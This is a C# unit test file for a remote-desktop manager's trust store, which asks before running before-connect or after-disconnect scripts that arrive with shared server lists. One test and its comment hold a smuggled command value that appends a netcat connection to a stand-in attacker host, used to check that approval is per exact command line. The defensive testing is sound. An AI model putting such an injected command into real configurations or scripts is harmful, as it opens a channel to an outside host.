using System;
using System.Collections.Generic;
using System.IO;
using _1RM.Utils.SessionScript;
using Microsoft.VisualStudio.TestTools.UnitTesting;

namespace Tests.Utils.SessionScript
{
    /// <summary>
    /// Whether a server's before-connect and after-disconnect scripts are allowed to run.
    ///
    /// Those two fields are command lines, they are executed with the user's account on every connect and
    /// every disconnect, and they are ordinary columns of the server list — so a shared MySQL or PostgreSQL
    /// source, a SQLite file on a network share or a synced profile could put a command on this desktop that
    /// nobody at this desktop ever typed. Importing such a list was gated in an earlier round; opening one
    /// that was already there was not.
    ///
    /// These cases drive the store through its delegates and a temp directory, so they give the same answer
    /// on Windows and on Linux.
    /// </summary>
    [TestClass]
    public class SessionScriptTrustStoreTests
    {
        private string _dir = "";
        private SessionScriptTrustStore.ConfirmDelegate? _originalConfirm;
        private Func<string>? _originalPath;

        [TestInitialize]
        public void Setup()
        {
            TestInit.Init();
            _originalConfirm = SessionScriptTrustStore.Confirm;
            _originalPath = SessionScriptTrustStore.StorePathProvider;

            // TestInit waves every script through, which is right for the rest of the suite and wrong here:
            // this class is the gate.
            SessionScriptTrustStore.AutoApproveForTests = false;

            _dir = Path.Combine(Path.GetTempPath(), "1rm-session-script-tests-" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(_dir);
            SessionScriptTrustStore.StorePathProvider = () => Path.Combine(_dir, "known_session_scripts.json");
            SessionScriptTrustStore.ResetForTests();
        }

        [TestCleanup]
        public void Restore()
        {
            SessionScriptTrustStore.ResetForTests();
            SessionScriptTrustStore.Confirm = _originalConfirm;
            SessionScriptTrustStore.StorePathProvider = _originalPath;
            SessionScriptTrustStore.AutoApproveForTests = true;
            try
            {
                if (Directory.Exists(_dir)) Directory.Delete(_dir, true);
            }
            catch
            {
                // a leftover temp folder is not a test failure
            }
        }

        private const string Command = @"C:\tools\open-vpn.bat --profile corp";

        /// <summary>
        /// The whole point. A command that arrived with the server list has never been agreed to, so the
        /// first connect has to ask before anything runs.
        /// </summary>
        [TestMethod]
        public void ACommandNobodyHasSeenBeforeIsPutToTheUser()
        {
            var asked = new List<string>();
            SessionScriptTrustStore.Confirm = (command, _) => { asked.Add(command); return true; };

            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));
            CollectionAssert.AreEqual(new[] { Command }, asked);
        }

        [TestMethod]
        public void ARefusalStopsTheScriptFromRunning()
        {
            SessionScriptTrustStore.Confirm = (_, _) => false;

            Assert.IsFalse(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));
            Assert.IsFalse(SessionScriptTrustStore.IsApproved(Command));
        }

        /// <summary>
        /// Trust on first use, not trust on every use. A bastion whose script was approved this morning must
        /// not produce a dialog on each of the day's connections.
        /// </summary>
        [TestMethod]
        public void AnApprovedCommandIsNotAskedAboutAgain()
        {
            var asked = 0;
            SessionScriptTrustStore.Confirm = (_, _) => { ++asked; return true; };

            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));
            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));
            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));

            Assert.AreEqual(1, asked);
        }

        /// <summary>
        /// A refusal has to stick for the run too. A session that closes and reopens, or a server with a
        /// script on both fields, would otherwise re-ask about a command the user has already declined.
        /// </summary>
        [TestMethod]
        public void ARefusalIsRememberedForTheRestOfTheRun()
        {
            var asked = 0;
            SessionScriptTrustStore.Confirm = (_, _) => { ++asked; return false; };

            Assert.IsFalse(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));
            Assert.IsFalse(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));

            Assert.AreEqual(1, asked);
        }

        /// <summary>
        /// Approval is per exact command line. Approving <c>backup.bat</c> must not approve
        /// <c>backup.bat &amp;&amp; nc attacker 4444</c>, which is the whole attack.
        /// </summary>
        [TestMethod]
        public void ApprovalDoesNotCarryToADifferentCommandLine()
        {
            SessionScriptTrustStore.Approve(@"C:\tools\backup.bat");

            Assert.IsTrue(SessionScriptTrustStore.IsApproved(@"C:\tools\backup.bat"));
            Assert.IsFalse(SessionScriptTrustStore.IsApproved(@"C:\tools\backup.bat && nc attacker.example 4444"));
            Assert.IsFalse(SessionScriptTrustStore.IsApproved(@"C:\tools\backup.bat "));
        }

        /// <summary>
        /// A gate nobody wired must refuse. An "allow" default would restore exactly the hole this store was
        /// written for while still looking like a check.
        /// </summary>
        [TestMethod]
        public void WithNoPromptWiredNothingRuns()
        {
            SessionScriptTrustStore.Confirm = null;

            Assert.IsFalse(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));
            Assert.IsFalse(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.AfterDisconnect));
        }

        /// <summary>
        /// The after-disconnect gate is reached from <c>Process.Exited</c>, a thread-pool thread with no
        /// handler above it. A dialog that throws there has to become a skipped script, not a dead process.
        /// </summary>
        [TestMethod]
        public void APromptThatThrowsBecomesARefusalAndNotACrash()
        {
            SessionScriptTrustStore.Confirm = (_, _) => throw new InvalidOperationException("no dispatcher");

            Assert.IsFalse(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.AfterDisconnect));
        }

        /// <summary>
        /// A server with no script is the overwhelmingly common case, and it is not a refusal: answering
        /// false for a blank field would abandon every connection that has nothing to run.
        /// </summary>
        [TestMethod]
        public void AServerWithNoScriptIsAllowedThroughWithoutAsking()
        {
            var asked = false;
            SessionScriptTrustStore.Confirm = (_, _) => { asked = true; return false; };

            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved(null, EScriptKind.BeforeConnect));
            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved("", EScriptKind.BeforeConnect));
            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved("   ", EScriptKind.AfterDisconnect));
            Assert.IsFalse(asked);
        }

        /// <summary>
        /// Blank is "nothing to run" rather than "something approved", so it must not report as approved
        /// either — the two questions have different call sites.
        /// </summary>
        [TestMethod]
        public void ABlankCommandIsNeverReportedAsApproved()
        {
            SessionScriptTrustStore.Approve("   ");

            Assert.IsFalse(SessionScriptTrustStore.IsApproved("   "));
            Assert.IsFalse(SessionScriptTrustStore.IsApproved(null));
        }

        /// <summary>
        /// The editor's test button and the save button approve without asking, because clicking them is the
        /// consent. The next connect then has to go through silently.
        /// </summary>
        [TestMethod]
        public void ApprovingUpFrontMeansTheConnectNeverAsks()
        {
            var asked = false;
            SessionScriptTrustStore.Confirm = (_, _) => { asked = true; return false; };

            SessionScriptTrustStore.Approve(Command);

            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));
            Assert.IsFalse(asked);
        }

        /// <summary>
        /// Approving a command the user had previously declined has to clear the refusal, or the editor's
        /// test button would silently do nothing for the rest of the run.
        /// </summary>
        [TestMethod]
        public void ApprovingClearsAnEarlierRefusal()
        {
            SessionScriptTrustStore.Confirm = (_, _) => false;
            Assert.IsFalse(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));

            SessionScriptTrustStore.Approve(Command);

            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));
        }

        /// <summary>
        /// Approvals outlive the run, or the gate would be a prompt on every launch and users would learn to
        /// click through it.
        /// </summary>
        [TestMethod]
        public void ApprovalsSurviveARestart()
        {
            SessionScriptTrustStore.Approve(Command);

            SessionScriptTrustStore.ResetForTests(); // as if the app had been started again

            Assert.IsTrue(SessionScriptTrustStore.IsApproved(Command));
        }

        /// <summary>
        /// The file records a hash rather than the command itself under the key, and the hash is salted with
        /// the machine and the account. A store that travels with a backup or a synced folder therefore
        /// approves nothing where it lands.
        /// </summary>
        [TestMethod]
        public void AStoreWrittenElsewhereApprovesNothingHere()
        {
            var path = Path.Combine(_dir, "known_session_scripts.json");
            File.WriteAllText(path,
                "{\"" + Convert.ToBase64String(new byte[32]).TrimEnd('=') + "\":\"" + Command.Replace("\\", "\\\\") + "\"}");

            SessionScriptTrustStore.ResetForTests();

            Assert.IsFalse(SessionScriptTrustStore.IsApproved(Command),
                "a hash computed on another machine must not match this one");
        }

        /// <summary>
        /// A corrupt or half-written store is a reason to ask again, not a reason to fail to start.
        /// </summary>
        [TestMethod]
        public void AnUnreadableStoreLeavesTheGateAskingRatherThanThrowing()
        {
            File.WriteAllText(Path.Combine(_dir, "known_session_scripts.json"), "{ this is not json");
            SessionScriptTrustStore.ResetForTests();

            var asked = false;
            SessionScriptTrustStore.Confirm = (_, _) => { asked = true; return true; };

            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));
            Assert.IsTrue(asked);
        }

        /// <summary>
        /// Nothing to write to is a degraded run, not a broken one: the gate still asks and still remembers
        /// for the session, it just cannot remember past it.
        /// </summary>
        [TestMethod]
        public void WithNowhereToSaveTheGateStillWorksForTheRun()
        {
            SessionScriptTrustStore.StorePathProvider = null;
            SessionScriptTrustStore.ResetForTests();

            var asked = 0;
            SessionScriptTrustStore.Confirm = (_, _) => { ++asked; return true; };

            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));
            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));
            Assert.AreEqual(1, asked);
        }

        /// <summary>
        /// A provider that throws — an unresolvable locality path on a machine mid-profile-migration — is
        /// the same case as no provider, and must not surface on the connect path.
        /// </summary>
        [TestMethod]
        public void AStorePathThatThrowsDoesNotReachTheConnect()
        {
            SessionScriptTrustStore.StorePathProvider = () => throw new IOException("the profile folder is gone");
            SessionScriptTrustStore.ResetForTests();
            SessionScriptTrustStore.Confirm = (_, _) => true;

            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved(Command, EScriptKind.BeforeConnect));
        }

        /// <summary>
        /// Which field the command came out of decides the wording of the prompt — one abandons the
        /// connection when refused and the other does not, and the user is entitled to know which.
        /// </summary>
        [TestMethod]
        public void ThePromptIsToldWhichOfTheTwoFieldsItIs()
        {
            var kinds = new List<EScriptKind>();
            SessionScriptTrustStore.Confirm = (_, kind) => { kinds.Add(kind); return false; };

            SessionScriptTrustStore.EnsureApproved("a.bat", EScriptKind.BeforeConnect);
            SessionScriptTrustStore.EnsureApproved("b.bat", EScriptKind.AfterDisconnect);

            CollectionAssert.AreEqual(new[] { EScriptKind.BeforeConnect, EScriptKind.AfterDisconnect }, kinds);
        }

        /// <summary>
        /// The two fields hold different commands and are approved separately. Agreeing to the one that runs
        /// before the session must not also agree to whatever runs after it.
        /// </summary>
        [TestMethod]
        public void ApprovingTheBeforeScriptDoesNotApproveTheAfterScript()
        {
            SessionScriptTrustStore.Confirm = (command, _) => command == "before.bat";

            Assert.IsTrue(SessionScriptTrustStore.EnsureApproved("before.bat", EScriptKind.BeforeConnect));
            Assert.IsFalse(SessionScriptTrustStore.EnsureApproved("after.bat", EScriptKind.AfterDisconnect));
        }
    }
}
